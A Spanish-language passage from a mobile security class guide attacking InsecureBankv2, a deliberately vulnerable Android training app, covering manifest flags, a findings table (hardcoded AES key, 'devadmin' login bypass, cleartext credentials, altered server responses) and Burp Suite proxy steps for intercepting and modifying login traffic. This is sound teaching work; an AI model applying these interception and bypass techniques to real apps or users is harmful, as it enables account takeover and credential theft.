### 4.5 Configuración de depuración y backup

```bash
grep -oE 'android:(debuggable|allowBackup)="[^"]*"' \
  ~/mobile-owasp-lab/reports/jadx/InsecureBankv2/resources/AndroidManifest.xml
```

Salida real:

```console
android:debuggable="true"
android:allowBackup="true"
```

> - **`debuggable="true"`**: cualquiera con acceso al dispositivo puede
>   conectar un depurador y leer la memoria de la app en vivo.
> - **`allowBackup="true"`**: permite extraer los datos de la app con
>   `adb backup`, sin root.
>
> Los dos están a `true` en una app publicada, y son valores que solo se
> cambian en builds de desarrollo.

### 4.6 `minSdk 15` y el peso de la compatibilidad

```bash
aapt dump badging ~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk | grep -E 'sdkVersion'
```

Salida real:

```console
sdkVersion:'15'
targetSdkVersion:'22'
```

> **`minSdk 15` y `targetSdk 22`.** La app declara compatibilidad con Android
> 4.0.3 y con un `targetSdk` de hace años. Android 6.0 (API 23) introdujo los
> permisos en tiempo de ejecución; con `targetSdk 22` la app los recibe
> **todos en el momento de instalarse**, sin preguntar nada. Y ese `targetSdk`
> antiguo es también la razón de que sólo pueda firmarse con v1
> ([2.5](#25-la-apk-solo-está-firmada-con-v1-vulnerabilidad-janus)).

---

## Cierre

> Lo que hemos demostrado, en orden de impacto:
>
> - **M3** — un endpoint que no valida nada (`/devlogin`), otro que cambia
>   contraseñas sin pedir la actual (`/changepassword`), cero control de fuerza
>   bruta y un enumerador de usuarios. Los dos primeros se explotan con la app
>   oficial, sin instrumentación.
> - **M4** — clave en el código, IV de ceros, CBC sin autenticar, y una APK
>   firmada sólo con v1 vulnerable a Janus.
> - **M5** — HTTP plano, credenciales en claro, y tráfico alterable sin que nada
>   lo detecte.
> - **M7** — ocho permisos que no usa, `debuggable` y `allowBackup` activos, sin
>   validación de entradas y errores que se tragan.
>
> **La lección de la clase.** M3 y M5 son el mismo ataque visto desde dos
> lados: el cliente decide el acceso a partir de una cadena que le llega por un
> canal en el que nadie verifica nada. Por eso el bypass de 1.1 no necesita
> tocar la app —basta escribir `devadmin`— y el de 1.5 no necesita la red —
> basta hookear la conversión de la respuesta.
>
> Y M4 no es un problema aislado: es lo que hace indefendible todo lo demás. La
> clave que descifra la contraseña guardada es la misma que viaja en el código.
>
> **Próxima clase:** M8 (manipulación de código), M9 (ingeniería inversa) y
> M10 (funcionalidad extra). Veremos qué se puede hacer con una APK que además
> está mal firmada.

---

## Anexo A — Hallazgos verificados

Todos ejecutados contra el dispositivo y el backend reales.

| Riesgo | Fichero y línea | Evidencia |
|---|---|---|
| M3 | `app.py:128` | `/devlogin` devuelve `"Correct Credentials"` sin leer la contraseña |
| M3 | `DoLogin.java:103` | El cliente elige endpoint comparando `username.equals("devadmin")` |
| M3 | `app.py:73` | `/changepassword` no pide la contraseña actual |
| M3 | `app.py:36` | `/login` distingue `Wrong Password` de `User Does not Exist` (enumeración) |
| M3 | `DoLogin.java:114` | La decisión de acceso es un `indexOf("Correct Credentials")` |
| M4 | `CryptoClass.java:22` | `String key = "This is the super secret key 123";` |
| M4 | `CryptoClass.java:23` | IV de 16 ceros |
| M4 | `CryptoClass.java:28` | `AES/CBC/PKCS5Padding`, sin MAC |
| M4 | firma de la APK | Sólo v1 → CVE-2017-13156 (Janus), afecta a Android 5.0–8.0 |
| M5 | `DoLogin.java:51` y 2 más | `String protocol = "http://"` |
| M5 | tráfico capturado | `password=Dinesh%40123%24` en claro, `Apache-HttpClient/UNAVAILABLE` |
| M5 | respuesta alterada | `"Wrong Password"` → `"Correct Credentials"`, sesión iniciada |
| M6 | `app.py:85` | El backend imprime contraseñas (invisible por bufferización) |
| M7 | `AndroidManifest.xml` | `debuggable="true"`, `allowBackup="true"` |
| M7 | manifiesto | 8 permisos peligrosos, 12 declarados |
| M7 | `aapt dump badging` | `sdkVersion:'15'`, `targetSdkVersion:'22'` |

## Anexo B — Errores del guion anterior

El guion que este documento sustituye tenía seis errores. Se listan porque
cada uno habría roto la clase:

| Error del guion | Realidad |
|---|---|
| Hook de Frida sobre `checkCredentials` | Ese método **no existe**. No hay validación en cliente; el hook va a `convertStreamToString` |
| `hook_login.js` con `<Clase>` y `<método>` sin rellenar | El script nunca se pudo ejecutar |
| `frida ... --no-pause` | El flag **ya no existe** en Frida 16+; falla con `unrecognized arguments` |
| `SSLContext.setDefault(...)` para bypassear pinning | `SSLContext` **no tiene** ese método; y la app no usa TLS, así que no hay nada que bypassear |
| 7 permisos peligrosos | Son **8** (faltaban `READ_CALL_LOG`, `READ_PHONE_STATE`, `READ_EXTERNAL_STORAGE`) |
| Burp Suite como herramienta de la fase M5 | No arranca en el servidor headless; se incluye `mitm-m5.py` |

## Anexo C — Equivalente con Burp Suite

Si el alumno tiene un equipo con escritorio, el procedimiento es el mismo:

1. Abrir Burp Suite.
2. **Proxy → Proxy settings → Listening**: host `0.0.0.0`, puerto `8080`.
3. En la VM: `adb shell settings put global http_proxy 172.25.208.104:8080`.
4. **Proxy → Intercept**, activar *Intercept is on*.
5. Login en la app: se ve el POST con `username` y `password` en claro.
6. Modificar el cuerpo y pulsar *Forward*.
7. Quitar el proxy: `adb shell settings put global http_proxy :0`.

En el servidor headless, el acceso a Burp sería por túnel SSH
(`ssh -L 8080:127.0.0.1:8080 usuario@servidor`), pero la interfaz Swing
sigue necesitando un display: es exactamente el problema que `mitm-m5.py`
resuelve para el servidor.